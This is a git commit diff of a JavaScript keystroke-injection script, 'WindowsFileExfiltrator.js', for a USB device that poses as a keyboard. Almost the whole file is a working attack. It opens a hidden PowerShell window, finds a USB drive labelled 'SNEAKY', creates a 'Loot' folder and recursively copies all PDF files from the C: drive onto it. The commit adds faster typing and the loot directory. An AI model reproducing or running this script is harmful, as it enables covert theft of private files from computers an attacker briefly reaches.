73e96e8a52160922b8378c722f5cd8b6c077e3c2
Calvin L <47407549+Coderdude112@users.noreply.github.com>
2020-04-27 18:40:02 -0600

    Update WindowsFileExfiltrator.js

--- HID-Scripts/WindowsFileExfiltrator.js
+++ HID-Scripts/WindowsFileExfiltrator.js
@@ -4,41 +4,45 @@
 // For config help go to Saytonic's video found here: https://youtu.be/I_BjCdJlCo4
 // This attack searches the SearchPath recursivly (All folders and sub-folders) for files that fit the FileTypes
 
-layout('us');				    // Set keyboard layout to US
-var Ready = "False"			// Sets Ready to false beacuse we are not ready to begin the attack
+layout('us');			  	  // Set keyboard layout to US
+typingSpeed(0,0);			  // Sets the typing speed to FAST
+var Ready = "False"		  // Sets Ready to false beacuse we are not ready to begin the attack
 
-function Attack() { 		// Initalizes the function Attack that acually exfiltrates the files
+function Attack() { 	  // Initalizes the function Attack that acually exfiltrates the files
   delay(2200);				  // Delay to make sure that File Explorer doesent take focus
   press("GUI r");			  // Opens a run command
   delay(500);
   type("powershell\n");	// Opens powershell
   delay(500);
 
-  var FileTypes = ["*.pdf"] // The file extensions that will be exfiltrated
-  var SearchDrive = ["C:"] 	// The path to look for files NOTE: this will include ALL folders and sub-folders
+  var FileTypes = ["*.pdf"] 	// The file extensions that will be exfiltrated
+  var SearchDrive = ["C:"]		// The path to look for files NOTE: this will include ALL folders and sub-folders
   
-  type("powershell -windowstyle hidden {"); 																								                                                // Makes the window hidden for the duration of the attack
-  type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'SNEAKY' } | select name;"); 												                      // Find the drive named "SNEAKY" and save it's path
-  type("Get-ChildItem C: -Recurse -Include " + FileTypes + " | ForEach-Object ` {copy $_ -Destination $usbPath.name};"); 				           	// Searches and copies the files in '3D Objects', 'Downloads', 'Documents', ect.
-  type("Get-ChildItem " + SearchDrive + "/ -Recurse -Include " + FileTypes + " | ForEach-Object ` {copy $_ -Destination $usbPath.name};"); 	// Searches and copies the files in the SearchDrive
+  type("powershell -windowstyle hidden {"); 													                                                                    // Makes the window hidden for the duration of the attack
+  type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'SNEAKY' } | select name;"); 						                              	// Find the drive named "SNEAKY" and save it's path to usbPath
+  type("$exfilPath = \"Loot\\File-Exfiltrator\";");												                                                                // Save the loot path to exfilPath
+  type("$totalPath = $usbPath.name + $exfilPath;");										                                                                 		// Save the total path for the loot including the drive letter to totalPath
+  type("mkdir $totalPath;");														                                                                                 	// Makes the loot directory
+  type("Get-ChildItem C: -Recurse -Include " + FileTypes + " | ForEach-Object ` {copy $_ -Destination $totalPath};"); 				            // Searches and copies the files in '3D Objects', 'Downloads', 'Documents', ect.
+  type("Get-ChildItem " + SearchDrive + "\\ -Recurse -Include " + FileTypes + " | ForEach-Object ` {copy $_ -Destination $totalPath};");	// Searches and copies the files in the SearchDrive
 
-  type("}\n");  																															                                                              // Adds the close curly bracket making the attack hidden and starts the attack 
+  type("exit;}\n");  																                                                                                      // Adds the close curly bracket making the attack hidden and starts the attack 
 }
 
-function Initalized() {// Initalizes the function that checks if the device has been initalized by the host before running the attack
+function Initalized() { 		// Initalizes the function that checks if the device has been initalized by the host before running the attack
   while (Ready = "False") {
     press("SCROLL");
     result = waitLED(SCROLL,10);
     
-    if (result.SCROLL) {// If this is true then the device is initalized. The loop will break and the attack will start
+    if (result.SCROLL) { 		// If this is true then the device is initalized. The loop will break and the attack will start
       Ready = "True";
       break;   
-    } else {				    // The device is not initalized so we will press scroll lock and retry
+    } else {                // The device is not initalized so we will press scroll lock and retry
         press("SCROLL");
       }
     
   }
 }
 
-Initalized(); 		     // Check if the host has initalized us
-Attack();					     // Run the attack
+Initalized(); // Check if the host has initalized us
+Attack();	    // Run the attack
